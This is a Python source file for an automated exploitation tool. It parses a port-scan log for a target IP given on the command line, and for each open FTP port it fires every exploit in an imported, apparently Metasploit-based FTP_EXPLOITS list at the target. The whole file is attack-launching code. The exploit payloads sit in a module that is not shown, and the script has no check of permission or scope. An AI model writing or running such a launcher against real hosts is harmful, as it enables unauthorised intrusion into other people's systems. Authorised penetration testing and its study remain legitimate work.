# main.py
import sys

from msf_ftp import FTP_EXPLOITS


class Port:
    def __init__(self, data, ip):
        self.port_number = int(data.split('/')[0])
        self.port_type = data.split(' ')[-1]
        self.ip = ip
        self.exploits = self.recons()

    def recons(self):
        if self.port_type == 'ftp':
            return [exploit(RHOSTS=self.ip) for exploit in FTP_EXPLOITS]
        return None

    def exploit(self):
        if self.exploits:
            for item in self.exploits:
                print(item.name)
                item.exploit()

class PortChecker:
    def __init__(self, ip):
        self.ip = ip
        self.ports = []
        with open(f'/tmp/scan.{ip}.log') as f:
            self.ports = [Port(line.replace('\n', ''), ip) for line in f.readlines() if 'open' in line]

    def scan(self):
        for port in self.ports:
            print(f"Scanning {port.port_number, port.port_type}")
            port.exploit()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise ValueError('ip of the target is required ')
    port_checker = PortChecker(sys.argv[1])
    port_checker.scan()
